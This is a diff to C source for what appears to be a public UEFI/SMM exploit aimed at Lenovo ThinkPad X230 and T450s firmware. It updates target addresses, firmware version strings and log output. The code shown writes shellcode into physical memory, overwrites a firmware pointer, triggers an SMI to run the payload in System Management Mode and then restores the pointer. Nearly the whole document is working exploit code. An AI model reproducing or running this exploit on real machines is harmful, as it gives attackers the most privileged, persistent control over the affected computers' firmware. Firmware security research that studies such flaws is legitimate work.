@@ -81,9 +81,9 @@ typedef struct _UEFI_EXPL_TARGET
 */
 static UEFI_EXPL_TARGET g_targets[] =
 {
-    { 0xd12493b0, 0x01, "Lenovo ThinkPad X230"  },
+    { 0xd12493b0, 0x01, "Lenovo ThinkPad X230 firmware 2.61"  },
 
-    { 0xa11a6750, 0x03, "Lenovo ThinkPad T450s" }
+    { 0xa0cd6750, 0x03, "Lenovo ThinkPad T450s firmware 1.11" }
 };
 
 // offsets of handler and context values in g_shellcode
@@ -173,7 +173,10 @@ void expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info(void)
         // get target model information
         UEFI_EXPL_TARGET *target = &g_targets[i];
 
-        printf(" %d: %s\n", i, target->name);
+        printf(
+            " %d: addr = 0x%llx, SMI = %d, name = %s\n", 
+            i, target->addr, target->smi_num, target->name
+        );
     }
 }
 //--------------------------------------------------------------------------------------
@@ -195,7 +198,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER han
     // get target model information
     expl_target = &g_targets[target];
 
-    printf(__FUNCTION__"(): Using target \"%s\"\n", expl_target->name);
+    printf("Using target \"%s\"\n", expl_target->name);
 
     if (handler)
     {
@@ -229,7 +232,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER han
     }
 
     printf(
-        __FUNCTION__"(): SMM payload handler address is 0x%llx with context at 0x%llx\n", 
+        "SMM payload handler address is 0x%llx with context at 0x%llx\n", 
         handler_phys_addr, context_phys_addr
     );
 
@@ -244,7 +247,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER han
         *(unsigned long long *)&shellcode[SHELLCODE_OFFS_HANDLER] = handler_phys_addr;
         *(unsigned long long *)&shellcode[SHELLCODE_OFFS_CONTEXT] = context_phys_addr;
 
-        printf(__FUNCTION__"(): Physical memory for shellcode allocated at 0x%llx\n", sc_phys_addr);
+        printf("Physical memory for shellcode allocated at 0x%llx\n", sc_phys_addr);
         
         if (uefi_expl_phys_mem_write(sc_phys_addr, sizeof(shellcode), shellcode))
         {
@@ -253,12 +256,12 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER han
             // read original pointer value
             if (uefi_expl_phys_mem_read(expl_target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val))
             {
-                printf(__FUNCTION__"(): Old pointer 0x%llx value is 0x%llx\n", expl_target->addr, ptr_val);
+                printf("Old pointer 0x%llx value is 0x%llx\n", expl_target->addr, ptr_val);
 
                 // overwrite pointer value
                 if (uefi_expl_phys_mem_write(expl_target->addr, sizeof(sc_phys_addr), (unsigned char *)&sc_phys_addr))
                 {
-                    printf(__FUNCTION__"(): Generating SMI %d...\n", expl_target->smi_num);
+                    printf("Generating SMI %d...\n", expl_target->smi_num);
 
                     if (!uefi_expl_smi_invoke(expl_target->smi_num))
                     {
@@ -270,7 +273,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER han
                         ret = true;
                     }
                     
-                    printf(__FUNCTION__"(): %s\n", ret ? "SUCCESS" : "FAILS");                    
+                    printf(__FUNCTION__"(): Exploitation %s\n", ret ? "success" : "false");                    
 
                     // restore overwritten value
                     uefi_expl_phys_mem_write(expl_target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val);
